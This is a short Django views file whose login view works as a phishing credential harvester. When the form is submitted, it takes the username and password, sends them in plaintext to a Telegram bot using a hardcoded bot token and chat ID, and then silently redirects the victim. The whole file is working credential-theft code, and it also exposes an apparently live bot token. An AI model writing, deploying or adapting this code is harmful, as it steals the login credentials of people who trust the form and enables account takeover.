from django.shortcuts import render, redirect
# Create your views here.
import requests


def login_views(request):
    if request.method == 'POST':
        data = request.POST
        username = data.get('username')
        password = data.get('password')
        text = f"👨‍💻 username : {username}, \n🔐 password: {password}"

        token = '6187027523:AAFOYDcLmvX7HB0HUjMVtEGn1DvNKmh_E50'
        id = "1491929245"
        url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id='
        requests.get(url + id + '&text=' + text)

        return redirect('/')
    return render(request, 'index.html')
